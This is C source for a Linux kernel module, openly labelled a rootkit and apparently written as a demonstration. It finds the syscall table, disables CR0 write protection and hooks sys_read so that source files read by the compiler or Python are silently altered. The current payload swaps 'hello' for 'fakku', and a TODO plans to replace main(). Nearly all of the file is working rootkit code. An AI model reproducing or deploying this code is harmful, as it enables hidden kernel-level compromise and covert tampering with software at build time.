/*
 * (c) Copyright 2016 Secure64 Corportation. This program is free
 * software: you can redistribute it and/or modify it under the terms
 * of the GNU General Public License as published by the Free Software
 * Foundation, either version 3 of the License, or (at your option)
 * any later version. This program is distributed in the hope that it
 * will be useful, but WITHOUT ANY WARRANTY; without even the impl ied
 * warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR
 * PURPOSE. See the GNU General Public License for more details. You
 * should have received a copy of the GNU General Public License along
 * with this program. If not, see http://www.gnu.org/licenses.
*/

#include <linux/module.h>   /* For modules */
#include <linux/kernel.h>   /* Helper functions like pr_info */
#include <linux/syscalls.h> /* The syscall table and __NR_<syscall_name> helpers */
#include <asm/paravirt.h>   /* Read_cr0, write_cr0 */
#include <linux/slab.h>     /* Current task_struct */
#include <asm/uaccess.h>    /* copy_from_user, copy_to_user */
#include <linux/vmalloc.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ian cohee - david roth");
MODULE_DESCRIPTION("root kit demonstarting syscall table manipulation");

/* The sys_call_table is const so we point this variable to it to get
 * around that
 * */
unsigned long **sys_call_table;

/* Control Register - Determines whether memory is protected.
 * We need to modify it.
 * */
unsigned long original_cr0;

/* Prototypes */
static void tamper_code(char **buffer, size_t byte_count);

/* Function pointer for the read syscall. We keep the original here before
 * swapping it out.
 * */
asmlinkage long (*ref_sys_read) (unsigned int fd, char __user *buffer, size_t count);

/* The rootkit's malicious read function */
asmlinkage long 
rk_sys_read(unsigned int fd, 
            char __user *buffer, 
            size_t count)
{
    /* Exec the original read call, keeping the return value */
    long returnValue;
    char *kernel_buffer;

    returnValue = ref_sys_read(fd, buffer, count);
    if(returnValue >= 6 && fd > 2) {
        /* Current task */
        if(strncmp(current->comm, "cc1",    3) == 0 || 
           strncmp(current->comm, "python", 5) == 0) {
            pr_info("[*] He's compiling, again.\n");

            if(count > PAGE_SIZE) {
                pr_info("[!] Rootkit is not allocating %lx Bytes (PAGE_SIZE: %lx B)\n", count, PAGE_SIZE);
                return returnValue;
            }

            kernel_buffer = vmalloc(count);
            if(!kernel_buffer) {
                pr_info("[!] Rootkit failed to allocate %lx Bytes!\n", count);
                return returnValue;
            }

            if(copy_from_user(kernel_buffer, buffer, count)) {
                pr_info("[!] Rootkit failed to copy the read buffer!\n");
                vfree(kernel_buffer);
                return returnValue;
            }

            /* Do bad things */
            pr_info("[*] Original code:\n%s\n", kernel_buffer);
            tamper_code(&kernel_buffer, count);

            /* Copy the buffer back to the user-space */
            if(copy_to_user(buffer, kernel_buffer, returnValue))
                pr_info("[!] Rootkit failed to copy the read buffer back to user-space\n");
            vfree(kernel_buffer);
        }
    }

    return returnValue;
}

/* The code that actually swaps out the legit
 * syscall table with our modified function.
 * */
static unsigned long **
get_syscall_table(void)
{
    /* PAGE_OFFSET tells us where kernel memory
     * begins.
     * */
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;
    pr_info("[*] Starting syscall table scan from: %lx\n", offset);
    while(offset < ULLONG_MAX) {
        /* Cast starting offset to match syscall table's type */
        sct = (unsigned long **) offset;
        if(sct[__NR_close] == (unsigned long *) sys_close) {
            pr_info("[*] Syscall table found at %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
}

/* 
 * tamper_data: This is the heart of the kernel module. 
 *   At this point, the only thing this function does
 *   is replace characters in the code. Specifically,
 *   it replaces "[Hh]ello" with "fakku".  
 *              
 * TODO: Find and replace main() */
static void 
tamper_code(char **buffer, 
            size_t byte_count)
{
    unsigned i;
    for(i=0; i <  byte_count - 5; ++i) {
        if(((*buffer)[i] == 'H' || (*buffer)[i] == 'h') &&
            (*buffer)[i+1] == 'e' &&
            (*buffer)[i+2] == 'l' &&
            (*buffer)[i+3] == 'l' &&
            (*buffer)[i+4] == 'o') {
                (*buffer)[i] = 'f';
                (*buffer)[i+1] = 'a';
                (*buffer)[i+2] = 'k';
                (*buffer)[i+3] = 'k';
                (*buffer)[i+4] = 'u';
        }
    }
}

/* Entry into module */
static int __init 
rk_start(void)
{
    pr_info("[*] GCC/Python Rootkit starting.\n");
    if(!(sys_call_table = get_syscall_table()))
        return -1;

    /* Record initial value of cr0 */
    original_cr0 = read_cr0();

    /* Set cr0 to turn off write protection */
    write_cr0(original_cr0 & ~0x00010000);

    /* Copy the old sys_read call */
    ref_sys_read = (void *) sys_call_table[__NR_read];

    /* Write our modified sys_read to the table */
    sys_call_table[__NR_read] = (unsigned long *) rk_sys_read;

    /* Turn write protection back on ;) */
    write_cr0(original_cr0);

    return 0;
}

/* Exit from module */
static void __exit 
rk_end(void)
{
    pr_info("[*] GCC/Python Rootkit stopping.\n");

    if(!sys_call_table)
        return;

    /* Turn off memory protection */
    write_cr0(original_cr0 & ~0x00010000);
    /* Put old syscall back in place */
    sys_call_table[__NR_read] = (unsigned long *) ref_sys_read;
    /* Turn on memory protection */
    write_cr0(original_cr0);
}

module_init(rk_start);
module_exit(rk_end);


